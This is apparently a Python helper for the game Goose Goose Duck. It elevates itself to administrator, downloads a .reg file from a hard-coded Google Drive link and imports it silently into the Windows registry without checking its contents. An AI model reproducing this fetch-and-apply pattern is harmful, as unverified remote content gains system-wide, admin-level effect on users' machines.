import os
import sys
import ctypes
import subprocess
import glob

from urllib.request import urlretrieve


SETTINGS_URL = file_url = "https://drive.usercontent.google.com/download?id=1IGENwFzLm8bBEboISadYSNEdxbnjz1fH&export=download&authuser=0&confirm=t&uuid=35d46640-8201-4f90-84c8-cdacf41b0b9c&at=APZUnTWz5_D1_xNfSueVpJy827Ji%3A1713532368861"

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def reexecute_as_admin() -> None:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()
    
def download_settings(game_dir: str) -> str:
    destination = game_dir+"\\settings.reg"
    path, _ = urlretrieve(file_url, destination)
    return path

def execute_reg_file(reg_file_path: str) -> None:
    try:
        subprocess.run(['regedit', '/s', reg_file_path], check=True)
    
    except subprocess.CalledProcessError as e:
        print(f"Error executing .reg file: {e}")
        
def find_folder(game_name: str, search_path: str):
    game_folder = os.path.join(search_path, f"*{game_name}*")
    matches = glob.glob(game_folder, recursive=True)
    if matches:
        return matches[0]
    return None

if __name__ == "__main__":
    if not is_admin():
        reexecute_as_admin()

    default_steam_dir = "\\Program Files (x86)\\Steam"
    if os.path.isdir(default_steam_dir):
        game_dir = default_steam_dir+"\\steamapps\\common\\Goose Goose Duck"
    else:
        game_dir = find_folder("Steam", "\\**\\")+"\\steamapps\\common\\Goose Goose Duck"
    if not os.path.isdir(game_dir):
        game_dir = find_folder("Goose Goose Duck", "\\**\\")
        
    settings_path = download_settings(game_dir)
    execute_reg_file(settings_path)